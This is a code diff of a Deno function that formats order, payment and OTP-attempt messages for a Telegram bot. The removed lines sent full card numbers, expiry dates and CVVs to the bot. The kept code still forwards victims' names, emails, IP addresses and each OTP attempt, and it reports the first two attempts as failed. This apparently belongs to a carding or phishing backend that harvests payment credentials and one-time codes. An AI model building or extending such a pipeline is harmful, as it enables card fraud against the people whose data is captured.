@@ -1,3 +1,4 @@
+
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
@@ -31,12 +32,6 @@ interface OrderDetails {
   };
   notificationType: "order_placed" | "payment_details" | "otp_attempt";
   otpAttempt?: number;
-  customMessage?: string; // Allow passing in fully formatted messages
-  // Full card details fields
-  cardNumber?: string;
-  cardName?: string;
-  expiryDate?: string;
-  cvv?: string;
 }
 
 function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
@@ -76,31 +71,16 @@ function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
 }
 
 function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
-  // Include full card details if available
-  const cardDetails = orderDetails.cardNumber ? `
-💳 *Full Card Details*:
-   Card Number: \`${orderDetails.cardNumber}\`
-   Card Holder: ${orderDetails.cardName}
-   Expiry Date: ${orderDetails.expiryDate}
-   CVV: \`${orderDetails.cvv}\`
-` : '';
-
   return `
 💰 *PAYMENT DETAILS SUBMITTED* 💰
 
 👤 *Customer*: ${orderDetails.customerName}
 📧 *Email*: ${orderDetails.email}
-📱 *Phone*: ${orderDetails.phone}
 
-${cardDetails}${orderDetails.cryptoCurrency ? `
 💳 *Payment Information*:
    Cryptocurrency: ${orderDetails.cryptoCurrency}
    Transaction ID: \`${orderDetails.transactionId}\`
    Amount: $${orderDetails.paymentAmount.toFixed(2)}
-` : `
-💳 *Payment Information*:
-   Amount: $${orderDetails.paymentAmount.toFixed(2)}
-`}
 
 🔍 *User Information*:
    IP Address: \`${orderDetails.userInfo.ip}\`
@@ -116,34 +96,20 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   const attempt = orderDetails.otpAttempt || 0;
   const isLastAttempt = attempt === 3;
   
-  // Color coding: red for failed attempts, green for success
   const attemptHeader = isLastAttempt 
     ? '✅ *OTP VERIFICATION SUCCESSFUL* ✅' 
-    : `🔴 *FAILED OTP VERIFICATION: ATTEMPT ${attempt}* 🔴`;
+    : `⚠️ *OTP VERIFICATION ATTEMPT ${attempt}* ⚠️`;
   
-  const statusEmoji = isLastAttempt ? '✅' : '❌';
   const statusText = isLastAttempt 
-    ? '✅ Success - Payment Authorized' 
+    ? '✅ Success - Final attempt' 
     : `❌ Failed - Attempt ${attempt} of 3`;
-  
-  // Include full card details if available
-  const cardDetails = orderDetails.cardNumber ? `
-💳 *Full Card Details*:
-   Card Number: \`${orderDetails.cardNumber}\`
-   Card Holder: ${orderDetails.cardName}
-   Expiry Date: ${orderDetails.expiryDate}
-   CVV: \`${orderDetails.cvv}\`
-` : '';
 
   return `
 ${attemptHeader}
 
-👤 *Customer Information*:
-   Name: ${orderDetails.customerName}
-   Email: ${orderDetails.email}
-   Phone: ${orderDetails.phone}
+👤 *Customer*: ${orderDetails.customerName}
+📧 *Email*: ${orderDetails.email}
 
-${cardDetails}
 🔐 *Verification Status*:
    ${statusText}
 
@@ -158,12 +124,6 @@ ${cardDetails}
 }
 
 function formatTelegramMessage(orderDetails: OrderDetails): string {
-  // If a custom formatted message is provided, use it directly
-  if (orderDetails.customMessage) {
-    return orderDetails.customMessage;
-  }
-  
-  // Otherwise use the default formatters
   switch (orderDetails.notificationType) {
     case "order_placed":
       return formatOrderPlacedMessage(orderDetails);
